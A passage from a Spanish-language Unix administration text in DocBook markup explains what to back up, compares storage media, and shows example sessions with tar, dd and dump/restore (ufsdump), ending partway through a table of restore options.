<!--br/-->Por &#x00FA;ltimo, &#x00BF;qu&#x00E9; almacenar? Obviamente debemos realizar copias de seguridad de los archivos que sean &#x00FA;nicos
a nuestro sistema; esto suele incluir directorios como /etc/, /usr/local/ o la ubicaci&#x00F3;n de los directorios
de usuario (dependiendo del Unix utilizado, /export/home/, /users/, /home/&#x2026;). Por supuesto, realizar
una copia de seguridad de directorios como /dev/ o /proc/ no tiene ninguna utilidad, de la misma forma

que no la tiene realizar backups de directorios del sistema como /bin/ o /lib/: su contenido est&#x00E1;
almacenado en la distribuci&#x00F3;n original del sistema operativo (por ejemplo, los CD-ROMs que utilizamos
para instalarlo).
  </para></section><!--end section--><!--l. 72--><section 
role="section"><title><abbrev role="title-mark">7.2</abbrev><anchor 
   id="x1-1020007.2"  ></anchor>Dispositivos de almacenamiento</title>
<!--l. 73--><para>  Existen multitud de dispositivos diferentes donde almacenar nuestras copias de seguridad, desde un
simple disco &#xFB02;exible hasta unidades de cinta de &#x00FA;ltima generaci&#x00F3;n. Evidentemente, cada uno tiene sus
ventajas y sus inconvenientes, pero utilicemos el medio que utilicemos, &#x00E9;ste ha de cumplir una norma b&#x00E1;sica:
ha de ser est&#x00E1;ndar. Con toda probabilidad muchos administradores pueden presumir de poseer los
streamers m&#x00E1;s modernos, con unidades de cinta del tama~no de una cajetilla de tabaco que son capaces de
almacenar gigas y m&#x00E1;s gigas de informaci&#x00F3;n; no obstante, utilizar dispositivos de &#x00FA;ltima generaci&#x00F3;n para
guardar los backups de nuestros sistemas puede convertirse en un problema: &#x00BF;qu&#x00E9; sucede si
necesitamos recuperar datos y no disponemos de esa unidad lectora tan avanzada? Imaginemos
simplemente que se produce un incendio y desaparece una m&#x00E1;quina, y con ella el dispositivo que
utilizamos para realizar copias de seguridad. En esta situaci&#x00F3;n, o disponemos de otra unidad
id&#x00E9;ntica a la perdida, o recuperar nuestra informaci&#x00F3;n va a ser algo dif&#x02CA;&#x0131;cil. Si en lugar de un
dispositivo moderno, r&#x00E1;pido y seguramente muy &#xFB01;able, pero incompatible con el resto, hubi&#x00E9;ramos
utilizado algo m&#x00E1;s habitual (una cinta de 8mm., un CD-ROM, o incluso un disco duro) no
tendr&#x02CA;&#x0131;amos problemas en leerlo desde cualquier sistema Unix, sin importar el hardware sobre el que
trabaja.
<!--br/-->
<!--br/-->Aqu&#x02CA;&#x0131; vamos a comentar algunos de los dispositivos de copia de seguridad m&#x00E1;s utilizados hoy en d&#x02CA;&#x0131;a; de
todos ellos (o de otros, no listados aqu&#x02CA;&#x0131;) cada administrador ha de elegir el que m&#x00E1;s se adapte a sus
necesidades. En la tabla  <ulink 
  url="#x1-1020011"  ><!--ref: devices--></ulink> se muestra una comparativa de todos ellos.
<!--br/-->
<!--br/-->Discos &#xFB02;exibles
<!--br/-->S&#x02CA;&#x0131;, aunque los cl&#x00E1;sicos diskettes cada d&#x02CA;&#x0131;a se utilicen menos, a&#x00FA;n se pueden considerar un dispositivo donde
almacenar copias de seguridad. Se trata de un medio muy barato y portable entre diferentes operativos
(evidentemente, esta portabilidad existe si utilizamos el disco como un dispositivo secuencial, sin crear
sistemas de &#xFB01;cheros). Por contra, su &#xFB01;abilidad es muy baja: la informaci&#x00F3;n almacenada se puede
borrar f&#x00E1;cilmente si el disco se aproxima a aparatos que emiten cualquier tipo de radiaci&#x00F3;n,
como un tel&#x00E9;fono m&#x00F3;vil o un detector de metales. Adem&#x00E1;s, la capacidad de almacenamiento de
los &#xFB02;oppies es muy baja, de poco m&#x00E1;s de 1 MB por unidad; esto hace que sea casi imposible
utilizarlos como medio de backup de grandes cantidades de datos, restringiendo su uso a &#xFB01;cheros
individuales.
<!--br/-->
<!--br/-->Un diskette puede utilizarse creando en &#x00E9;l un sistema de &#xFB01;cheros, mont&#x00E1;ndolo bajo un directorio, y copiando
en los archivos a guardar. Por ejemplo, podemos hacer un backup de nuestro &#xFB01;chero de claves en un disco
&#xFB02;exible de esta forma.

     </para><literallayout role="verbatim">
&#x00A0;luisa:~#&#x00A0;mkfs&#x00A0;-t&#x00A0;ext2&#x00A0;/dev/fd0
&#x00A0;mke2fs&#x00A0;1.14,&#x00A0;9-Jan-1999&#x00A0;for&#x00A0;EXT2&#x00A0;FS&#x00A0;0.5b,&#x00A0;95/08/09
&#x00A0;Linux&#x00A0;ext2&#x00A0;filesystem&#x00A0;format
&#x00A0;Filesystem&#x00A0;label=
&#x00A0;360&#x00A0;inodes,&#x00A0;1440&#x00A0;blocks
&#x00A0;72&#x00A0;blocks&#x00A0;(5.00%)&#x00A0;reserved&#x00A0;for&#x00A0;the&#x00A0;super&#x00A0;user
&#x00A0;First&#x00A0;data&#x00A0;block=1
&#x00A0;Block&#x00A0;size=1024&#x00A0;(log=0)
&#x00A0;Fragment&#x00A0;size=1024&#x00A0;(log=0)
&#x00A0;1&#x00A0;block&#x00A0;group
&#x00A0;8192&#x00A0;blocks&#x00A0;per&#x00A0;group,&#x00A0;8192&#x00A0;fragments&#x00A0;per&#x00A0;group
&#x00A0;360&#x00A0;inodes&#x00A0;per&#x00A0;group
&#x00A0;
&#x00A0;Writing&#x00A0;inode&#x00A0;tables:&#x00A0;done
&#x00A0;Writing&#x00A0;superblocks&#x00A0;and&#x00A0;filesystem&#x00A0;accounting&#x00A0;information:&#x00A0;done
&#x00A0;luisa:~#&#x00A0;mount&#x00A0;-t&#x00A0;ext2&#x00A0;/dev/fd0&#x00A0;/mnt/
&#x00A0;luisa:~#&#x00A0;cp&#x00A0;/etc/passwd&#x00A0;/mnt/
&#x00A0;luisa:~#&#x00A0;umount&#x00A0;/mnt/
&#x00A0;luisa:~#
</literallayout>
<!--l. 137--><para>Si quisi&#x00E9;ramos recuperar el archivo, no tendr&#x02CA;&#x0131;amos m&#x00E1;s que montar de nuevo el diskette y copiar el &#xFB01;chero en
su ubicaci&#x00F3;n original. No obstante, este uso de los discos &#xFB02;exibles es minoritario; es m&#x00E1;s habitual utilizarlo
como un dispositivo secuencial (como una cinta), sin crear en &#x00E9;l sistemas de &#xFB01;cheros &#x2013; que quiz&#x00E1;s son
incompatibles entre diferentes clones de Unix &#x2013; sino accediendo directamente al dispositivo.
Por ejemplo, si de nuevo queremos hacer un backup de nuestro &#xFB01;chero de passwords, pero
siguiendo este modelo de trabajo, podemos utilizar la orden tar (comentada m&#x00E1;s adelante) para
conseguirlo:

     </para><literallayout role="verbatim">
&#x00A0;luisa:~#&#x00A0;tar&#x00A0;cvf&#x00A0;/dev/fd0&#x00A0;/etc/passwd
&#x00A0;tar:&#x00A0;Removing&#x00A0;leading&#x00A0;&#x2018;/&#x2019;&#x00A0;from&#x00A0;absolute&#x00A0;path&#x00A0;names&#x00A0;in&#x00A0;the&#x00A0;archive
&#x00A0;etc/passwd
&#x00A0;luisa:~#
</literallayout>
<!--l. 154--><para>Para recuperar ahora el archivo guardado, volvemos a utilizar la orden tar indicando como contenedor la
unidad de disco correspondiente:

     </para><literallayout role="verbatim">
&#x00A0;luisa:~#&#x00A0;tar&#x00A0;xvf&#x00A0;/dev/fd0
&#x00A0;etc/passwd
&#x00A0;luisa:~#
</literallayout>
<!--l. 163--><para>Discos duros
<!--br/-->Es posible utilizar una unidad de disco duro completa (o una partici&#x00F3;n) para realizar copias de seguridad;
como suced&#x02CA;&#x0131;a con los discos &#xFB02;exibles, podemos crear un sistema de &#xFB01;cheros sobre la unidad o la partici&#x00F3;n
correspondiente, montarla, y copiar los &#xFB01;cheros que nos interese guardar en ella (o recuperarlos). De la
misma forma, tambi&#x00E9;n podemos usar la unidad como un dispositivo secuencial y convertirlo en un
contenedor tar o cpio; en este caso hemos de estar muy atentos a la hora de especi&#xFB01;car la unidad,
ya que es muy f&#x00E1;cil equivocarse de dispositivo y machacar completamente la informaci&#x00F3;n de
un disco completo (antes tambi&#x00E9;n pod&#x02CA;&#x0131;a suceder, pero ahora la probabilidad de error es m&#x00E1;s
alta). Por ejemplo, si en lugar del nombre del dispositivo correcto (supongamos /dev/hdc)
especi&#xFB01;camos otro (como /dev/hdd), estaremos destruyendo la informaci&#x00F3;n guardada en este
&#x00FA;ltimo.
<!--br/-->
<!--br/-->Algo muy interesante en algunas situaciones es utilizar como dispositivo de copia un disco duro id&#x00E9;ntico al
que est&#x00E1; instalado en nuestro sistema, y del que deseamos hacer el backup; en este caso es muy
sencillo hacer una copia de seguridad completa. Imaginemos por ejemplo que /dev/hda y
/dev/hdc son dos discos exactamente iguales; en este caso, si queremos conseguir una imagen
especular del primero sobre el segundo, no tenemos m&#x00E1;s que utilizar la orden dd con los par&#x00E1;metros
adecuados:

     </para><literallayout role="verbatim">
&#x00A0;luisa:~#&#x00A0;dd&#x00A0;if=/dev/hda&#x00A0;of=/dev/hdc&#x00A0;bs=2048
&#x00A0;1523+0&#x00A0;records&#x00A0;in
&#x00A0;1523+0&#x00A0;records&#x00A0;out
&#x00A0;luisa:~#
</literallayout>
<!--l. 193--><para>Cintas magn&#x00E9;ticas
<!--br/-->Las cintas magn&#x00E9;ticas han sido durante a~nos (y siguen siendo en la actualidad) el dispositivo de backup por
excelencia. Las m&#x00E1;s antiguas, las cintas de nueve pistas, son las que mucha gente imagina al hablar de este
medio: un elemento circular con la cinta enrollada en &#x00E9;l; este tipo de dispositivos se utiliz&#x00F3; durante mucho
tiempo, pero en la actualidad est&#x00E1; en desuso, ya que a pesar de su alta &#xFB01;abilidad y su relativa
velocidad de trabajo, la capacidad de este medio es muy limitada (de hecho, las m&#x00E1;s avanzadas son
capaces de almacenar menos de 300 MB., algo que no es su&#xFB01;ciente en la mayor parte de sistemas
actuales).
<!--br/-->
<!--br/-->Despu&#x00E9;s de las cintas de 9 pistas aparecieron las cintas de un cuarto de pulgada (denominadas QIC), mucho
m&#x00E1;s peque~nas en tama~no que las anteriores y con una capacidad m&#x00E1;xima de varios Gigabytes (aunque la
mayor parte de ellas almacenan menos de un Giga); se trata de cintas m&#x00E1;s baratas que las de 9 pistas, pero
tambi&#x00E9;n m&#x00E1;s lentas. El medio ya no va descubierto, sino que va cubierto de una envoltura de
pl&#x00E1;stico.
<!--br/-->
<!--br/-->A &#xFB01;nales de los ochenta aparece un nuevo modelo de cinta que releg&#x00F3; a las cintas QIC a un segundo plano y
que se ha convertido en el medio m&#x00E1;s utilizado en la actualidad: se trata de las cintas de 8mm., dise~nadas
en su origen para almacenar v&#x02CA;&#x0131;deo. Estas cintas, del tama~no de una cassette de audio, tienen una
capacidad de hasta cinco Gigabytes, lo que las hace perfectas para la mayor&#x02CA;&#x0131;a de sistemas: como toda la
informaci&#x00F3;n a salvaguardar cabe en un mismo dispositivo, el operador puede introducir la cinta en la
unidad del sistema, ejecutar un sencillo shellscript, y dejar que el backup se realice durante toda la noche;
al d&#x02CA;&#x0131;a siguiente no tiene m&#x00E1;s que veri&#xFB01;car que no ha habido errores, retirar la cinta de la unidad, y
etiquetarla correctamente antes de guardarla. De esta forma se consigue que el proceso de copia de
seguridad sea sencillo y efectivo.
<!--br/-->
<!--br/-->No obstante, este tipo de cintas tiene un grave inconveniente: como hemos dicho, originalmente estaban
dise~nadas para almacenar v&#x02CA;&#x0131;deo, y se basan en la misma tecnolog&#x02CA;&#x0131;a para registrar la informaci&#x00F3;n. Pero con
una importante diferencia (<citation>[?]</citation>): mientras que perder unos bits de la cinta donde hemos grabado
los mejores momentos de nuestra &#x00FA;ltima &#xFB01;esta no tiene mucha importancia, si esos mismos
bits los perdemos de una cinta de backup el resto de su contenido puede resultar inservible.
Es m&#x00E1;s, es probable que despu&#x00E9;s de unos cuantos usos (incluidas las lecturas) la cinta se da~ne
irreversiblemente. Para intentar solucionar estos problemas aparecieron las cintas DAT, de 4mm.,
dise~nadas ya en origen para almacenar datos; estos dispositivos, algo m&#x00E1;s peque~nos que las cintas
de 8mm. pero con una capacidad similar, son el mejor sustituto de las cintas antiguas: son
mucho m&#x00E1;s resistentes que &#x00E9;stas, y adem&#x00E1;s relativamente baratas (aunque algo m&#x00E1;s caras que las de
8mm.).
<!--br/-->
<!--br/-->Hemos dicho que en las cintas de 8mm. (y en las de 4mm.) se pueden almacenar hasta 5 GB. de
informaci&#x00F3;n. No obstante, algunos fabricantes anuncian capacidades de hasta 14 GB. utilizando compresi&#x00F3;n
hardware, sin dejar muy claro si las cintas utilizadas son est&#x00E1;ndar o no (<citation>[?]</citation>); evidentemente, esto puede
llevarnos a problemas de los que antes hemos comentado: &#x00BF;qu&#x00E9; sucede si necesitamos recuperar datos y no
disponemos de la unidad lectora original? Es algo vital que nos aseguremos la capacidad de una f&#x00E1;cil
recuperaci&#x00F3;n en caso de p&#x00E9;rdida de nuestros datos (este es el objetivo de los backups al &#xFB01;n y al cabo), por lo
que quiz&#x00E1;s no es conveniente utilizar esta compresi&#x00F3;n hardware a no ser que sea estrictamente necesario y no
hayamos podido aplicar otra soluci&#x00F3;n.
<!--br/-->
<!--br/-->CD-ROMs
<!--br/-->En la actualidad s&#x00F3;lo se utilizan cintas magn&#x00E9;ticas en equipos antiguos o a la hora de almacenar grandes

cantidades de datos &#x2013; del orden de Gigabytes. Hoy en d&#x02CA;&#x0131;a, muchas m&#x00E1;quinas Unix poseen unidades
grabadoras de CD-ROM, un hardware barato y, lo que es m&#x00E1;s importante, que utiliza dispositivos de muy
bajo coste y con una capacidad de almacenamiento su&#xFB01;ciente para muchos sistemas: con una unidad
grabadora, podemos almacenar m&#x00E1;s de 650 Megabytes en un CD-ROM que cuesta menos de 150 pesetas.
Por estos motivos, muchos administradores se decantan por realizar sus copias de seguridad en uno o
varios CD-ROMs; esto es especialmente habitual en estaciones de trabajo o en PCs de sobremesa corriendo
alg&#x00FA;n clon de Unix (Linux, Solaris o FreeBSD por regla general), donde la cantidad de datos a
salvaguardar no es muy elevada y se ajusta a un par de unidades de CD, cuando no a una
sola.
<!--br/-->
<!--br/-->En el punto  <ulink 
  url="#x1-1070007.3.4"  ><!--ref: cdrom--></ulink> se comenta el mecanismo para poder grabar en un CD-ROM; aunque los ejemplos que
comentaremos son b&#x00E1;sicos, existen multitud de posibilidades para trabajar con este medio. Por ejemplo,
podemos utilizar dispositivos CD-RW, similares a los anteriores pero que permiten borrar la informaci&#x00F3;n
almacenada y volver a utilizar el dispositivo (algo muy &#x00FA;til en situaciones donde reutilizamos uno o varios
juegos de copias), o utilizar medios con una mayor capacidad de almacenamiento (CD-ROMs
de 80 minutos, capaces de almacenar hasta 700 MB.); tambi&#x00E9;n es muy &#x00FA;til lo que se conoce
como la grabaci&#x00F3;n multisesi&#x00F3;n, algo que nos va a permitir ir actualizando nuestras copias de
seguridad con nuevos archivos sin perder la informaci&#x00F3;n que hab&#x02CA;&#x0131;amos guardado previamente.
</para><section role="center"><title/>
<!--l. 271--><para> </para><table ><informaltable><tgroup cols="4"><tbody><row><entry 
 align="center"><para> Dispositivo </para></entry><entry 
 align="center"><para>Fiabilidad</para></entry><entry 
 align="center"><para>Capacidad </para></entry><entry 
 align="center"><para>Coste/MB</para></entry>
 </row><row><entry 
 align="center"><para>   Diskette  </para></entry><entry 
 align="center"><para>  Baja    </para></entry><entry 
 align="center"><para>   Baja     </para></entry><entry 
 align="center"><para>   Alto    </para></entry>
 </row><row><entry 
 align="center"><para> CD-ROM </para></entry><entry 
 align="center"><para>  Media   </para></entry><entry 
 align="center"><para>  Media    </para></entry><entry 
 align="center"><para>  Bajo    </para></entry>
 </row><row><entry 
 align="center"><para> Disco duro </para></entry><entry 
 align="center"><para>  Alta    </para></entry><entry 
 align="center"><para>Media/Alta</para></entry><entry 
 align="center"><para>  Medio.  </para></entry>
 </row><row><entry 
 align="center"><para>Cinta 8mm.</para></entry><entry 
 align="center"><para>  Media   </para></entry><entry 
 align="center"><para>   Alta     </para></entry><entry 
 align="center"><para>  Medio.  </para></entry>
 </row><row><entry 
 align="center"><para>Cinta DAT</para></entry><entry 
 align="center"><para>  Alta    </para></entry><entry 
 align="center"><para>   Alta     </para></entry><entry 
 align="center"><para>  Medio.  </para></entry>
 </row><row><entry 
 align="center"><para>                </para></entry>
 </row></tbody></tgroup></informaltable>
<blockquote role="caption"><title role="caption"><anchor 
   id="x1-1020011"  ></anchor>Cuadro&#x00A0;7.1</title><para>Comparaci&#x00F3;n de diferentes medios de almacenamiento secundario.</para></blockquote>
</section>
<!--l. 291--><para>
  </para></section><!--end section--><!--l. 291--><section 
role="section"><title><abbrev role="title-mark">7.3</abbrev><anchor 
   id="x1-1030007.3"  ></anchor>Algunas &#x00F3;rdenes para realizar copias de seguridad</title>
<!--l. 292--><para>  Aunque muchos clones de Unix ofrecen sus propias herramientas para realizar copias de seguridad de
todo tipo (por ejemplo, tenemos mksysb y savevg/restvg en AIX, fbackup y frecover en
HP-UX, bru en IRIX, fsphoto en SCO Unix, ufsdump/ufsrestore en Solaris&#x2026;), casi todas
estas herramientas suelen presentar un grave problema a la hora de recuperar archivos: se
trata de software propietario, por lo que si queremos restaurar total o parcialmente archivos
almacenados con este tipo de programas, necesitamos el propio programa para hacerlo. En
determinadas situaciones, esto no es posible o es muy dif&#x02CA;&#x0131;cil: imaginemos un departamento que
dispone de s&#x00F3;lo una estaci&#x00F3;n Silicon Graphics corriendo IRIX y pierde todos los datos de un disco,
incluida la utilidad bru; si ha utilizado esta herramienta para realizar backups, necesitar&#x00E1; otra
estaci&#x00F3;n con el mismo operativo para poder restaurar estas copias, lo que obviamente puede ser
problem&#x00E1;tico.
<!--br/-->
<!--br/-->Por este motivo, muchos administradores utilizan herramientas est&#x00E1;ndar para realizar las copias de
seguridad de sus m&#x00E1;quinas; estas herramientas suelen ser tan simples como un shellscript que se
plani&#xFB01;ca para que autom&#x00E1;ticamente haga backups utilizando &#x00F3;rdenes como tar o cpio, programas
habituales en cualquier clon de Unix y que no presentan problemas de interoperabilidad entre
diferentes operativos. De esta forma, si en la estaci&#x00F3;n Silicon Graphics del ejemplo anterior
se hubiera utilizado tar para realizar las copias de seguridad, &#x00E9;stas se podr&#x02CA;&#x0131;an restaurar sin
problemas desde una m&#x00E1;quina SPARC corriendo Solaris, y transferir los &#xFB01;cheros de nuevo a la
Silicon.

  </para><!--l. 316--><section 
role="subsection"><title><abbrev role="title-mark">7.3.1</abbrev><anchor 
   id="x1-1040007.3.1"  ></anchor>dump/restore</title>
<!--l. 317--><para>  La herramienta cl&#x00E1;sica para realizar backups en entornos Unix es desde hace a~nos dump,
que vuelca sistemas de &#xFB01;cheros completos (una partici&#x00F3;n o una partici&#x00F3;n virtual en los
sistemas que las soportan, como Solaris); restore se utiliza para recuperar archivos de
esas copias. Se trata de una utilidad disponible en la mayor&#x02CA;&#x0131;a de clones del sistema
operativo <anchor 
   id="x1-104001f1"  ></anchor><footnote><para>     HP-UX, IRIX, SunOS, Linux&#x2026;en Solaris se llama ufsdump y en AIX backup.</para></footnote>,
potente (no diremos &#x2018;sencilla&#x2019;) y lo m&#x00E1;s importante: las copias son completamente compatibles
entre Unices, de forma que por ejemplo podemos restaurar un backup realizado en IRIX en un
sistema HP-UX. Adem&#x00E1;s, como veremos luego, la mayor parte de las versiones de dump permiten
realizar copias de seguridad sobre m&#x00E1;quinas remotas directamente desde l&#x02CA;&#x0131;nea de &#x00F3;rdenes (en el
caso que la variante de nuestro sistema no lo permita, podemos utilizar rdump/rrestore) sin
m&#x00E1;s que indicar el nombre de m&#x00E1;quina precediendo al dispositivo donde se ha de realizar la
copia.
<!--br/-->
<!--br/-->La sintaxis general de la orden dump es
</para><section role="center"><title/>
<!--l. 335--><para> dump opciones argumentos fs</para></section>
<!--l. 339--><para>donde &#x2018;opciones&#x2019; son las opciones de la copia de seguridad, &#x2018;argumentos&#x2019; son los argumentos de dichas
opciones, y &#x2018;fs&#x2019; es el sistema de &#xFB01;cheros a salvaguardar. Se trata de una sintaxis algo peculiar:
mientras que lo habitual en Unix es especi&#xFB01;car cada argumento a continuaci&#x00F3;n de la opci&#x00F3;n
adecuada (por ejemplo, &#x2018;find . -perm 700 -type f&#x2019; indica un argumento &#x2018;700&#x2019; para la
opci&#x00F3;n &#x2018;perm&#x2019; y uno &#x2018;f&#x2019; para &#x2018;type&#x2019;), en la orden dump primero especi&#xFB01;camos toda la lista de
opciones y a continuaci&#x00F3;n todos sus argumentos; no todas las opciones necesitan un argumento, y
adem&#x00E1;s la lista de argumentos tiene que corresponderse exactamente, en orden y n&#x00FA;mero, con
las opciones que los necesitan (por ejemplo, si &#x2018;find&#x2019; tuviera una sintaxis similar, la orden
anterior se habr&#x02CA;&#x0131;a tecleado como &#x2018;find . -perm -type 700 f&#x2019;). AIX y Linux son los &#x00FA;nicos
Unices donde la sintaxis de dump (recordemos que en el primero se denomina backup) es la
habitual.
<!--br/-->
<!--br/-->Las opciones de &#x2018;dump&#x2019; m&#x00E1;s utilizadas son las que se muestran en la tabla  <ulink 
  url="#x1-1040022"  ><!--ref: dumpops--></ulink>; en las p&#x00E1;ginas man de cada clon
de Unix se suelen incluir recomendaciones sobre par&#x00E1;metros espec&#x02CA;&#x0131;&#xFB01;cos para modelos de cintas
determinados, por lo que como siempre es m&#x00E1;s que recomendable su consulta. Fij&#x00E1;ndonos en la tabla,
podemos ver que la opci&#x00F3;n &#x2018;u&#x2019; actualiza el archivo /etc/dumpdates tras realizar una copia de seguridad
con &#x00E9;xito; es conveniente que este archivo exista antes de utilizar dump por primera vez (podemos crearlo
con la orden touch), ya que si no existe no se almacenar&#x00E1; informaci&#x00F3;n sobre las copias de seguridad
de cada sistema de &#xFB01;cheros (informaci&#x00F3;n necesaria, por ejemplo, para poder realizar backups
progresivos). En este archivo dump &#x2013; la propia orden lo hace, el administrador no necesita
modi&#xFB01;car el archivo a mano&#x2026;y no debe hacerlo &#x2013; registra informaci&#x00F3;n de las copias de cada sistema
de archivos, su nivel, y la fecha de realizaci&#x00F3;n, de forma que su aspecto puede ser similar al
siguiente:

     </para><literallayout role="verbatim">
&#x00A0;anita:~#&#x00A0;cat&#x00A0;/etc/dumpdates
&#x00A0;/dev/dsk/c0d0s6&#x00A0;&#x00A0;&#x00A0;0&#x00A0;Thu&#x00A0;Jun&#x00A0;22&#x00A0;05:34:20&#x00A0;CEST&#x00A0;2000
&#x00A0;/dev/dsk/c0d0s7&#x00A0;&#x00A0;&#x00A0;2&#x00A0;Wed&#x00A0;Jun&#x00A0;21&#x00A0;02:53:03&#x00A0;CEST&#x00A0;2000
&#x00A0;anita:~#
</literallayout>
<!--l. 376--><para>
</para><section role="center"><title/>
<!--l. 376--><para> </para><table ><informaltable><tgroup cols="3"><tbody><row><entry 
 align="center"><para>Opci&#x00F3;n</para></entry><entry 
 align="center"><para>               Acci&#x00F3;n realizada                        </para></entry><entry 
 align="center"><para>Argumento</para></entry>
 </row><row><entry 
 align="center"><para>  0&#x2013;9  </para></entry><entry 
 align="center"><para>         Nivel de la copia de seguridad               </para></entry><entry 
 align="center"><para>   NO     </para></entry>
 </row><row><entry 
 align="center"><para>   u   </para></entry><entry 
 align="center"><para>  Actualiza /etc/dumpdates al &#xFB01;nalizar el backup   </para></entry><entry 
 align="center"><para>   NO     </para></entry>
 </row><row><entry 
 align="center"><para>    f    </para></entry><entry 
 align="center"><para> Indica una cinta diferente de la usada por defecto  </para></entry><entry 
 align="center"><para>    S&#x00CD;       </para></entry>
 </row><row><entry 
 align="center"><para>   b   </para></entry><entry 
 align="center"><para>              Tama~no de bloque                      </para></entry><entry 
 align="center"><para>    S&#x00CD;       </para></entry>
 </row><row><entry 
 align="center"><para>   c   </para></entry><entry 
 align="center"><para>    Indica que la cinta destino es un cartucho       </para></entry><entry 
 align="center"><para>   NO     </para></entry>
 </row><row><entry 
 align="center"><para>  W  </para></entry><entry 
 align="center"><para>Ignora todas las opciones excepto el nivel del backup</para></entry><entry 
 align="center"><para>   NO     </para></entry>
 </row><row><entry 
 align="center"><para>        </para></entry>
 </row></tbody></tgroup></informaltable>
<blockquote role="caption"><title role="caption"><anchor 
   id="x1-1040022"  ></anchor>Cuadro&#x00A0;7.2</title><para>Opciones de la orden dump</para></blockquote>
</section>
<!--l. 398--><para>El uso de dump puede ser excesivamente complejo, especialmente en sistemas antiguos donde es incluso
necesario especi&#xFB01;car la densidad de la cinta en bytes por pulgada o su longitud en pies; no obstante, hoy en
d&#x02CA;&#x0131;a la forma m&#x00E1;s habitual de invocar a esta orden es &#x2018;dump [1-9]ucf cinta fs&#x2019;, es decir, una copia de
seguridad del sistema de &#xFB01;cheros recibido como argumento, de un determinado nivel y sobre la unidad de
cinta especi&#xFB01;cada. Por ejemplo para realizar una copia de seguridad completa sobre la unidad de cinta
/dev/rmt de la partici&#x00F3;n l&#x00F3;gica /dev/dsk/c0d0s7, en Solaris podemos utilizar la orden siguiente (podemos
ver que nos muestra mucha informaci&#x00F3;n sobre el progreso de nuestra copia de seguridad en cada
momento):

     </para><literallayout role="verbatim">
&#x00A0;anita:~#&#x00A0;ufsdump&#x00A0;0cuf&#x00A0;/dev/rmt&#x00A0;/dev/dsk/c0d0s7
&#x00A0;DUMP:&#x00A0;Date&#x00A0;of&#x00A0;this&#x00A0;level&#x00A0;0&#x00A0;dump:&#x00A0;Thu&#x00A0;Jun&#x00A0;22&#x00A0;10:03:28&#x00A0;2000
&#x00A0;DUMP:&#x00A0;Date&#x00A0;of&#x00A0;last&#x00A0;level&#x00A0;0&#x00A0;dump:&#x00A0;the&#x00A0;epoch
&#x00A0;DUMP:&#x00A0;Dumping&#x00A0;/dev/dsk/c0d0s7&#x00A0;(/export/home)&#x00A0;to&#x00A0;/dev/rmt
&#x00A0;DUMP:&#x00A0;mapping&#x00A0;(Pass&#x00A0;I)&#x00A0;[regular&#x00A0;files]
&#x00A0;DUMP:&#x00A0;mapping&#x00A0;(Pass&#x00A0;II)&#x00A0;[directories]
&#x00A0;DUMP:&#x00A0;estimated&#x00A0;24523&#x00A0;blocks&#x00A0;(118796KB)
&#x00A0;DUMP:&#x00A0;Writing&#x00A0;63&#x00A0;Kilobyte&#x00A0;records
&#x00A0;DUMP:&#x00A0;dumping&#x00A0;(Pass&#x00A0;III)&#x00A0;[directories]
&#x00A0;DUMP:&#x00A0;dumping&#x00A0;(Pass&#x00A0;IV)&#x00A0;[regular&#x00A0;files]
&#x00A0;DUMP:&#x00A0;level&#x00A0;0&#x00A0;dump&#x00A0;on&#x00A0;Thu&#x00A0;Jun&#x00A0;22&#x00A0;10:05:31&#x00A0;CEST&#x00A0;2000
&#x00A0;DUMP:&#x00A0;24550&#x00A0;blocks&#x00A0;(118927KB)&#x00A0;on&#x00A0;1&#x00A0;volume
&#x00A0;DUMP:&#x00A0;DUMP&#x00A0;IS&#x00A0;DONE
&#x00A0;anita:~#
</literallayout>
<!--l. 427--><para>Para realizar copias remotas, como hemos dicho antes, no tenemos m&#x00E1;s que anteponer el nombre del sistema
donde deseemos realizar el volcado al nombre del dispositivo donde se va a almacenar, separado de &#x00E9;ste por
el car&#x00E1;cter &#x2018;:&#x2019;; opcionalmente se puede indicar el nombre de usuario en el sistema remoto, separ&#x00E1;ndolo del
nombre de m&#x00E1;quina por &#x2018;@&#x2019;:

     </para><literallayout role="verbatim">
&#x00A0;anita:~#&#x00A0;ufsdump&#x00A0;0cuf&#x00A0;toni@luisa:/dev/st0&#x00A0;/dev/dsk/c0d0s7
</literallayout>
<!--l. 437--><para>Si estamos utilizando rdump, hemos de tener de&#xFB01;nido un nombre de m&#x00E1;quina denominado
<!--br/-->&#x2018;dumphost&#x2019; en nuestro archivo /etc/hosts, que ser&#x00E1; el sistema donde se almacene la copia remota. De
cualquier forma (usemos dump, ufsdump o rdump), el host remoto ha de considerarnos como una m&#x00E1;quina de
con&#xFB01;anza (a trav&#x00E9;s de /etc/hosts.equiv o .rhosts), con las consideraciones de seguridad que esto
implica.
<!--br/-->
<!--br/-->&#x00BF;C&#x00F3;mo restaurar los backups realizados con dump? Para esta tarea se utiliza la utilidad restore
(ufsrestore en Solaris), capaz de extraer &#xFB01;cheros individuales, directorios o sistemas de archivos
completos. La sintaxis de esta orden es
</para><section role="center"><title/>
<!--l. 449--><para> restore opciones argumentos archivos</para></section>
<!--l. 453--><para>donde &#x2018;opciones&#x2019; y &#x2018;argumentos&#x2019; tienen una forma similar a &#x2018;dump&#x2019; (es decir, toda la lista de
opciones seguida de toda la lista de argumentos de las mismas, excepto en AIX y Linux, donde la
notaci&#x00F3;n es la habitual), y &#x2018;archivos&#x2019; evidentemente representa una lista de directorios y
&#xFB01;cheros para restaurar. En la tabla  <ulink 
  url="#x1-1040033"  ><!--ref: restoreops--></ulink> se muestra un resumen de las opciones m&#x00E1;s utilizadas.
</para><section role="center"><title/>
<!--l. 460--><para> </para><table ><informaltable><tgroup cols="3"><tbody><row><entry 
 align="center"><para>Opci&#x00F3;n</para></entry><entry 
 align="center"><para>                  Acci&#x00F3;n realizada                            </para></entry><entry 
 align="center"><para>Argumento</para></entry>
 </row><row><entry 
 align="center"><para>   r   </para></entry><entry 
 align="center"><para>             Restaura la cinta completa                    </para></entry><entry 
 align="center"><para>   NO     </para></entry>
 </row><row><entry 
 align="center"><para>    f    </para></entry><entry 
 align="center"><para>   Indica el dispositivo o archivo donde est&#x00E1; el backup     </para></entry><entry 
 align="center"><para>    S&#x00CD;       </para></entry>
 </row><row><entry 
 align="center"><para>    i    </para></entry><entry 
 align="center"><para>                 Modo interactivo                           </para></entry><entry 
 align="center"><para>   NO     </para></entry>
 </row><row><entry 
 align="center"><para>   x   </para></entry><entry 
 align="center"><para>Extrae los archivos y directorios desde el directorio actual</para></entry><entry 
 align="center"><para>   NO     </para></entry>
 </row><row><entry 
 align="center"><para>   t   </para></entry><entry 
 align="center"><para>    Imprime los nombres de los archivos de la cinta       </para></entry><entry 
 align="center"><para>   NO     </para></entry>
 </row><row><entry 
